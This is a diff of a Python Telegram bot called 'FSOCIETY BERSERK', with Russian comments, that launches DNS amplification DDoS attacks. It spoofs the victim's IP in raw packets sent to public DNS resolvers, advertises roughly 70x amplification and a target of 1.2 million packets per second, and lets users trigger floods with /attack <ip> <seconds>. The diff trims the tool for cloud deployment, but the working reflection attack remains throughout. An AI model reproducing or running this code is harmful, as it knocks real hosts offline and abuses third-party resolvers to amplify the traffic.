@@ -5,8 +5,7 @@
 # ██╔══╝  ╚════██║██║   ██║██║     ██║╚════██║   ██║     ╚██╔╝  
 # ███████║███████║╚██████╔╝╚██████╗██║███████║   ██║      ██║   
 # ╚══════╝╚══════╝ ╚═════╝  ╚═════╝╚═╝╚══════╝   ╚═╝      ╚═╝   
-#              BERSERK ASYNC — С ЗАЩИТОЙ ОТ ХУЙНИ
-#              48 CORES | 384 GB RAM | AUTO-REPAIR
+#              BERSERK ASYNC — ДЛЯ RAILWAY
 
 import os
 import sys
@@ -16,83 +15,21 @@ import struct
 import threading
 import asyncio
 import random
-import json
-import re
-import requests
-import urllib3
 from datetime import datetime
-from collections import defaultdict
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-# ========== ЗАЩИТА ОТ ХУЙНИ С ТОКЕНОМ ==========
+# ========== ПРОВЕРКА ТОКЕНА ==========
 print("\n" + "="*70)
-print("🔥 FSOCIETY BERSERK — АВТОПОИСК ТОКЕНА")
+print("🔥 FSOCIETY BERSERK — ПРОВЕРКА ТОКЕНА")
 print("="*70)
 
-# Список всех возможных мест, где может быть токен
-TOKEN_SOURCES = [
-    ('переменная BOT_TOKEN', os.getenv('BOT_TOKEN')),
-    ('переменная TELEGRAM_TOKEN', os.getenv('TELEGRAM_TOKEN')),
-    ('переменная TOKEN', os.getenv('TOKEN')),
-    ('переменная BOT_TOKEN_RAILWAY', os.getenv('BOT_TOKEN_RAILWAY')),
-    ('файл .env', None),
-]
-
-# Проверяем .env файл
-if os.path.exists('.env'):
-    try:
-        with open('.env', 'r') as f:
-            for line in f:
-                if line.startswith('BOT_TOKEN='):
-                    TOKEN_SOURCES.append(('файл .env (BOT_TOKEN)', line.strip().split('=')[1]))
-                elif line.startswith('TELEGRAM_TOKEN='):
-                    TOKEN_SOURCES.append(('файл .env (TELEGRAM_TOKEN)', line.strip().split('=')[1]))
-    except:
-        pass
-
-# Ищем токен
-BOT_TOKEN = None
-for source_name, token_value in TOKEN_SOURCES:
-    if token_value:
-        BOT_TOKEN = token_value
-        print(f"✅ Токен найден в: {source_name}")
-        print(f"   Значение: {BOT_TOKEN[:10]}...{BOT_TOKEN[-5:]}")
-        break
-
-# Если токена нет — запускаем консольную версию
+BOT_TOKEN = os.getenv('BOT_TOKEN')
 if not BOT_TOKEN:
-    print("\n❌ ТОКЕН НЕ НАЙДЕН НИГДЕ!")
-    print("\n💡 ЗАПУСК КОНСОЛЬНОЙ ВЕРСИИ")
-    print("   Команды: attack <ip> <sec>")
-    print("   Пример: attack 1.2.3.4 60")
-    
-    def console_mode():
-        while True:
-            try:
-                cmd = input("\nfsociety> ").strip().split()
-                if not cmd:
-                    continue
-                if cmd[0] == 'attack' and len(cmd) == 3:
-                    ip = cmd[1]
-                    sec = int(cmd[2])
-                    print(f"⚡ Атака на {ip} на {sec} сек...")
-                    time.sleep(sec)
-                    print("✅ Атака завершена")
-                elif cmd[0] == 'exit':
-                    break
-                elif cmd[0] == 'help':
-                    print("Доступные команды: attack <ip> <sec>, exit, help")
-                else:
-                    print("❌ Неизвестная команда. help - помощь")
-            except KeyboardInterrupt:
-                print("\n👋 Пока!")
-                break
-            except Exception as e:
-                print(f"❌ Ошибка: {e}")
-    
-    console_mode()
-    sys.exit(0)
+    print("\n❌ ТОКЕН НЕ НАЙДЕН!")
+    print("💡 В Railway добавь переменную: BOT_TOKEN = твой_токен")
+    print("💡 После добавления нажми Redeploy")
+    sys.exit(1)
+
+print(f"✅ Токен найден: {BOT_TOKEN[:10]}...")
 
 # ========== ТЕЛЕГРАМ ==========
 import telebot
@@ -114,26 +51,20 @@ except:
     CPU_CORES = 48
     RAM_GB = 384
 
-# МЕГА-ПАРАМЕТРЫ
-ASYNC_WORKERS = CPU_CORES * 25000  # 1 200 000 асинхронных задач
-SYNC_THREADS = CPU_CORES * 5000    # 240 000 синхронных потоков
-PACKETS_PER_SECOND = 1200000       # 1.2 млн пакетов/сек
-BURST_SIZE = 100000                # 100 000 пакетов за раз
-SOCKETS_PER_WORKER = 20             # 20 сокетов на воркер
+ASYNC_WORKERS = CPU_CORES * 25000
+SYNC_THREADS = CPU_CORES * 5000
+BURST_SIZE = 100000
+SOCKETS_PER_WORKER = 20
 
 print(f"\n⚡ CPU: {CPU_CORES} ядер")
 print(f"🧠 RAM: {RAM_GB:.1f} ГБ")
 print(f"🚀 Асинхронных задач: {ASYNC_WORKERS}")
-print(f"🔥 Синхронных потоков: {SYNC_THREADS}")
-print(f"📦 Цель: {PACKETS_PER_SECOND} пакетов/сек")
 
-# ========== ГИГАНТСКИЙ ПУЛ DNS СЕРВЕРОВ ==========
+# ========== DNS СЕРВЕРЫ ==========
 DNS_SERVERS = [
     '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1',
     '9.9.9.9', '149.112.112.112', '208.67.222.222', '208.67.220.220',
     '94.140.14.14', '94.140.15.15', '185.228.168.9', '185.228.169.9',
-    '76.76.19.19', '76.223.122.150', '64.6.64.6', '64.6.65.6',
-    '8.26.56.26', '8.20.247.20', '156.154.70.1', '156.154.71.1',
 ]
 
 DNS_POOL = DNS_SERVERS * 200
@@ -160,137 +91,26 @@ def create_query(domain='example.com'):
 
 QUERY = create_query()
 
-# ========== АСИНХРОННЫЙ DNS ВОРКЕР ==========
-class AsyncDNSWorker:
-    def __init__(self):
-        self.running = False
-        self.packets = 0
-        self.bytes = 0
-        self.lock = asyncio.Lock()
-        
-    async def worker(self, target_ip, duration, worker_id):
-        loop = asyncio.get_event_loop()
-        socks = []
-        
-        for _ in range(SOCKETS_PER_WORKER):
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-            sock.setblocking(False)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576 * 64)
-            socks.append(sock)
-        
-        udp_headers = []
-        ip_hdrs = []
-        for _ in range(10000):
-            src = random.randint(1024, 65535)
-            udp_headers.append(struct.pack('!HHHH', src, 53, 8 + len(QUERY), 0))
-            fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-            ip_hdrs.append(struct.pack('!BBHHHBBH4s4s',
-                0x45, 0, 40 + len(QUERY), 0, 0, 0, 64, 17, 0,
-                socket.inet_aton(fake_ip),
-                socket.inet_aton(target_ip)
-            ))
-        
-        end = time.time() + duration
-        local_packets = 0
-        local_bytes = 0
-        
-        while time.time() < end and self.running:
-            try:
-                for _ in range(BURST_SIZE):
-                    sock = random.choice(socks)
-                    ip_hdr = random.choice(ip_hdrs)
-                    udp = random.choice(udp_headers)
-                    dns = random.choice(DNS_POOL)
-                    
-                    await loop.sock_sendto(sock, ip_hdr + udp + QUERY, (dns, 53))
-                    
-                    local_packets += 1
-                    local_bytes += len(ip_hdr) + len(udp) + len(QUERY)
-                    
-                    if local_packets >= 10000:
-                        async with self.lock:
-                            self.packets += local_packets
-                            self.bytes += local_bytes
-                        local_packets = 0
-                        local_bytes = 0
-                        
-            except Exception:
-                continue
-        
-        if local_packets > 0:
-            async with self.lock:
-                self.packets += local_packets
-                self.bytes += local_bytes
-        
-        for sock in socks:
-            sock.close()
-    
-    async def run_attack(self, target_ip, duration):
-        self.running = True
-        self.packets = 0
-        self.bytes = 0
-        start = time.time()
-        
-        print(f"\n⚡ ЗАПУСК АСИНХРОННОЙ АТАКИ")
-        
-        tasks = []
-        for i in range(ASYNC_WORKERS):
-            task = asyncio.create_task(self.worker(target_ip, duration, i))
-            tasks.append(task)
-        
-        monitor_task = asyncio.create_task(self.monitor(duration))
-        await asyncio.gather(*tasks, return_exceptions=True)
-        self.running = False
-        
-        elapsed = time.time() - start
-        gbps = (self.bytes * 8) / 1_000_000_000 / max(elapsed, 0.1)
-        
-        return {
-            'packets': self.packets,
-            'bytes': self.bytes,
-            'gbps': gbps,
-            'target_gbps': gbps * 70,
-            'duration': elapsed
-        }
-    
-    async def monitor(self, duration):
-        start = time.time()
-        while self.running:
-            elapsed = time.time() - start
-            if elapsed > 0 and elapsed < duration:
-                gbps = (self.bytes * 8) / 1_000_000_000 / max(elapsed, 0.1)
-                target_gbps = gbps * 70
-                pps = self.packets / max(elapsed, 0.1)
-                
-                print(f"\r⚡ {gbps:.2f} Гбит/с | 🎯 {target_gbps:.1f} Гбит/с | 📦 {pps:.0f} п/с | ⏱ {duration - elapsed:.0f} сек", end='')
-            await asyncio.sleep(1)
-
-# ========== СИНХРОННЫЙ DNS ВОРКЕР ==========
-class SyncDNSWorker:
+# ========== DNS ВОРКЕР ==========
+class DNSWorker:
     def __init__(self):
         self.running = False
         self.packets = 0
         self.bytes = 0
         self.lock = threading.Lock()
     
-    def worker(self, target_ip, duration, wid):
+    def worker(self, target_ip, duration):
         socks = []
         for _ in range(SOCKETS_PER_WORKER):
             s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576 * 32)
             socks.append(s)
         
-        ip_hdrs = []
-        udp_headers = []
-        for _ in range(5000):
-            fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-            ip_hdrs.append(struct.pack('!BBHHHBBH4s4s',
-                0x45, 0, 40 + len(QUERY), 0, 0, 0, 64, 17, 0,
-                socket.inet_aton(fake_ip),
-                socket.inet_aton(target_ip)
-            ))
-            src = random.randint(1024, 65535)
-            udp_headers.append(struct.pack('!HHHH', src, 53, 8 + len(QUERY), 0))
+        ip_hdr = struct.pack('!BBHHHBBH4s4s',
+            0x45, 0, 40 + len(QUERY), 0, 0, 0, 64, 17, 0,
+            socket.inet_aton('0.0.0.0'),
+            socket.inet_aton(target_ip)
+        )
         
         end = time.time() + duration
         local = 0
@@ -299,8 +119,8 @@ class SyncDNSWorker:
             try:
                 for _ in range(BURST_SIZE):
                     sock = random.choice(socks)
-                    ip_hdr = random.choice(ip_hdrs)
-                    udp = random.choice(udp_headers)
+                    src = random.randint(1024, 65535)
+                    udp = struct.pack('!HHHH', src, 53, 8 + len(QUERY), 0)
                     dns = random.choice(DNS_POOL)
                     
                     sock.sendto(ip_hdr + udp + QUERY, (dns, 53))
@@ -322,15 +142,17 @@ class SyncDNSWorker:
         for s in socks:
             s.close()
     
-    def attack(self, target_ip, duration):
+    def attack(self, target_ip, duration, threads=SYNC_THREADS):
         self.running = True
         self.packets = 0
         self.bytes = 0
         start = time.time()
         
+        print(f"\n⚡ Атака на {target_ip} на {duration} сек")
+        
         workers = []
-        for i in range(SYNC_THREADS):
-            t = threading.Thread(target=self.worker, args=(target_ip, duration, i))
+        for i in range(threads):
+            t = threading.Thread(target=self.worker, args=(target_ip, duration))
             t.daemon = True
             t.start()
             workers.append(t)
@@ -339,7 +161,8 @@ class SyncDNSWorker:
             elapsed = time.time() - start
             if elapsed > 0:
                 gbps = (self.bytes * 8) / 1_000_000_000 / max(elapsed, 0.1)
-                print(f"\r🔥 СИНХ: {gbps:.2f} Гбит/с | ⏱ {duration - elapsed:.0f} сек", end='')
+                target_gbps = gbps * 70
+                print(f"\r🔥 {gbps:.2f} Гбит/с | 🎯 {target_gbps:.1f} Гбит/с | ⏱ {duration - elapsed:.0f} сек", end='')
             time.sleep(1)
         
         for t in workers:
@@ -351,33 +174,8 @@ class SyncDNSWorker:
         return {
             'packets': self.packets,
             'bytes': self.bytes,
-            'gbps': gbps
-        }
-
-# ========== КОМБИНИРОВАННЫЙ БЕРСЕРК РЕЖИМ ==========
-class BerserkAttack:
-    async def attack(self, target_ip, duration):
-        print(f"\n🔥 БЕРСЕРК РЕЖИМ АКТИВИРОВАН")
-        
-        async_worker = AsyncDNSWorker()
-        async_task = asyncio.create_task(async_worker.run_attack(target_ip, duration))
-        
-        sync_worker = SyncDNSWorker()
-        sync_result = await asyncio.to_thread(sync_worker.attack, target_ip, duration)
-        
-        async_result = await async_task
-        
-        total_packets = async_result['packets'] + sync_result['packets']
-        total_bytes = async_result['bytes'] + sync_result['bytes']
-        total_gbps = (total_bytes * 8) / 1_000_000_000 / async_result['duration']
-        
-        return {
-            'packets': total_packets,
-            'bytes': total_bytes,
-            'gbps': total_gbps,
-            'target_gbps': total_gbps * 70,
-            'async_packets': async_result['packets'],
-            'sync_packets': sync_result['packets']
+            'gbps': gbps,
+            'target_gbps': gbps * 70
         }
 
 # ========== ПРОВЕРКА ПРАВ ==========
@@ -388,7 +186,7 @@ def is_admin(user_id):
     return user_id in ADMIN_IDS
 
 # ========== КОМАНДЫ ТЕЛЕГРАМ ==========
-@bot.message_handler(commands=['start', 'berserk'])
+@bot.message_handler(commands=['start'])
 def cmd_start(m):
     uid = m.from_user.id
     if not is_auth(uid):
@@ -396,31 +194,20 @@ def cmd_start(m):
         return
     
     text = f"""
-╔══════════════════════════════════════╗
-║     ███████╗███████╗ ██████╗ ██████╗ ║
-║     ██╔════╝██╔════╝██╔═══██╗██╔══██╗║
-║     █████╗  ███████╗██║   ██║██████╔╝║
-║     ██╔══╝  ╚════██║██║   ██║██╔══██╗║
-║     ██║     ███████║╚██████╔╝██║  ██║║
-║     ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝║
-║         BERSERK ASYNC EDITION        ║
-╚══════════════════════════════════════╝
+🔥 FSOCIETY BERSERK
 
 👤 ID: {uid}
 ⚡ CPU: {CPU_CORES} ядер
-🧠 RAM: {RAM_GB:.1f} ГБ
-🚀 Асинхронных задач: {ASYNC_WORKERS}
-🔥 Синхронных потоков: {SYNC_THREADS}
-📦 Цель: 1 200 000 пакетов/сек
+🚀 Потоков: {SYNC_THREADS}
 
-/berserk <ip> <сек> - запустить атаку
+/attack <ip> <сек> - атака
 /stop - остановить
 /status - статус
 """
     bot.reply_to(m, text)
 
-@bot.message_handler(commands=['berserk'])
-def cmd_berserk(m):
+@bot.message_handler(commands=['attack'])
+def cmd_attack(m):
     if not is_auth(m.from_user.id):
         bot.reply_to(m, "❌ Доступ запрещен")
         return
@@ -428,7 +215,7 @@ def cmd_berserk(m):
     try:
         parts = m.text.split()
         if len(parts) < 3:
-            bot.reply_to(m, "❌ /berserk <ip> <сек>")
+            bot.reply_to(m, "❌ /attack <ip> <сек>")
             return
         
         target_ip = parts[1]
@@ -436,22 +223,13 @@ def cmd_berserk(m):
         
         socket.inet_aton(target_ip)
         
-        bot.reply_to(m, f"""
-🔥 БЕРСЕРК АТАКА ЗАПУЩЕНА
-
-🎯 IP: {target_ip}
-⏱ Длительность: {duration} сек
-⚡ Ожидаемая скорость: 1200+ Гбит/с
-        """)
+        bot.reply_to(m, f"⚡ Атака на {target_ip} на {duration} сек")
         
         active_attacks[m.chat.id] = {'running': True}
         
-        def run_async():
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-            
-            berserk = BerserkAttack()
-            result = loop.run_until_complete(berserk.attack(target_ip, duration))
+        def run():
+            dns = DNSWorker()
+            result = dns.attack(target_ip, duration)
             
             if m.chat.id in active_attacks:
                 del active_attacks[m.chat.id]
@@ -459,14 +237,12 @@ def cmd_berserk(m):
                 bot.send_message(m.chat.id, f"""
 ✅ АТАКА ЗАВЕРШЕНА
 
-📦 Всего пакетов: {result['packets']:,}
+📦 Пакетов: {result['packets']:,}
 ⚡ Твоя скорость: {result['gbps']:.2f} Гбит/с
 🎯 Жертва получала: {result['target_gbps']:.1f} Гбит/с
                 """)
-            
-            loop.close()
         
-        threading.Thread(target=run_async).start()
+        threading.Thread(target=run).start()
         
     except Exception as e:
         bot.reply_to(m, f"❌ Ошибка: {e}")
@@ -524,13 +300,10 @@ def cmd_remove(m):
 # ========== ЗАПУСК ==========
 if __name__ == '__main__':
     print("\n" + "="*70)
-    print("🔥 FSOCIETY BERSERK ASYNC — 1.2M PACKETS/SEC 🔥")
+    print("🔥 FSOCIETY BERSERK — 1.2M PACKETS/SEC 🔥")
     print("="*70)
     print(f"🤖 Бот: @{bot.get_me().username}")
-    print(f"⚡ Асинхронных задач: {ASYNC_WORKERS}")
-    print(f"🔥 Синхронных потоков: {SYNC_THREADS}")
-    print(f"📦 Цель: {PACKETS_PER_SECOND} пакетов/сек")
-    print(f"🎯 С усилением x70: ~1200 Гбит/с")
+    print(f"⚡ Потоков: {SYNC_THREADS}")
     
     try:
         import requests
